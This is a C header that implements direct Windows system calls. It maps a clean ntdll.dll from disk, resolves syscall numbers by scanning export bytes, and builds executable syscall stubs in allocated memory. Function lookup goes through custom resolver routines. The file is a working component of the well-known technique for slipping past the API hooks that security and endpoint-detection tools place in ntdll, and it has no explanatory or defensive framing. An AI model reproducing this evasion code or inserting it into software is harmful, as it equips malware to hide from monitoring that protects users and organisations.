#ifndef DIRECT_SYSCALL_H
#define DIRECT_SYSCALL_H

#include "winapi_loader.h"

/* ================= Macros ================= */
#define SYSCALL_PREPARE(name)                  \
    do {                                      \
        NTDLL_DISK_CTX ctx = MapNtdllFromDisk(); \
        g_ssn  = ResolveSSN(&ctx, name);      \
        g_stub = BuildDirectSyscallStub(&ctx, g_ssn); \
    } while (0)

#define SYSCALL_CALL(type) ((type)g_stub)

/* ================= Strings ================= */
STRINGA(ntdll_dll,  "ntdll.dll");
STRINGW(ntdll_path, "\\SystemRoot\\System32\\ntdll.dll");

STRINGA(ntallocvm,  "NtAllocateVirtualMemory");
STRINGA(ntprotectvm,"NtProtectVirtualMemory");
STRINGA(ntcreatefile,"NtCreateFile");
STRINGA(ntcreatesection,"NtCreateSection");
STRINGA(ntmapview,  "NtMapViewOfSection");

/* ================= Globals ================= */
static DWORD g_ssn;
static void *g_stub;

/* ================= Types ================= */
typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _NTDLL_DISK_CTX {
    void  *base;
    SIZE_T size;
} NTDLL_DISK_CTX;

/* ================= Disk-backed NTDLL ================= */
static NTDLL_DISK_CTX MapNtdllFromDisk(void) {
    NTDLL_DISK_CTX ctx = {0};

    NTSTATUS (NTAPI *NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    NTSTATUS (NTAPI *NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
    NtCreateFile    = (void *)myGetProcAddress(ntdll, ntcreatefile);
    NtCreateSection = (void *)myGetProcAddress(ntdll, ntcreatesection);
    NtMapViewOfSection = (void *)myGetProcAddress(ntdll, ntmapview);

    UNICODE_STRING us;
    InitUnicodeString(&us, ntdll_path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hFile;
    IO_STATUS_BLOCK iosb;
    NtCreateFile(&hFile, FILE_GENERIC_READ, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);

    HANDLE hSection;
    NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);

    NtMapViewOfSection(hSection, (HANDLE)-1, &ctx.base, 0, 0, NULL, &ctx.size, ViewShare, 0, PAGE_READONLY);

    return ctx;
}

/* ================= PE helpers ================= */
static BYTE *GetExport(NTDLL_DISK_CTX *ctx, const char *name) {
    BYTE *base = (BYTE *)ctx->base;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *n = (char *)(base + names[i]);
        const char *a = n;
        const char *b = name;
        while (*a && *b && *a == *b) { a++; b++; }
        if (!*a && !*b)
            return base + funcs[ords[i]];
    }

    return NULL;
}

/* ================= SSN resolution ================= */
static DWORD ResolveSSN(NTDLL_DISK_CTX *ctx, const char *name) {
    BYTE *f = GetExport(ctx, name);

    if (f[0] == 0x4C && f[1] == 0x8B &&
        f[2] == 0xD1 && f[3] == 0xB8)
        return *(DWORD *)(f + 4);

    for (int i = 0; i < 32; i++)
        if (f[i] == 0xB8 && f[i+5] == 0x0F && f[i+6] == 0x05)
            return *(DWORD *)(f + i + 1);

    return 0xFFFFFFFF;
}

/* ================= Direct syscall stub ================= */
static void *BuildDirectSyscallStub(NTDLL_DISK_CTX *ctx, DWORD ssn) {
    NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
    NtAllocateVirtualMemory = (void *)myGetProcAddress(ntdll, ntallocvm);
    NtProtectVirtualMemory  = (void *)myGetProcAddress(ntdll, ntprotectvm);

    PVOID base = NULL;
    SIZE_T size = 11;

    NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    BYTE *p = (BYTE *)base;
    p[0] = 0x4C; p[1] = 0x8B; p[2] = 0xD1; // mov r10, rcx
    p[3] = 0xB8; *(DWORD *)(p + 4) = ssn;   // mov eax, ssn
    p[8] = 0x0F; p[9] = 0x05;               // syscall
    p[10] = 0xC3;                           // ret

    ULONG oldProt;
    NtProtectVirtualMemory((HANDLE)-1, &base, &size, PAGE_EXECUTE_READ, &oldProt);

    return base;
}

#endif // DIRECT_SYSCALL_H
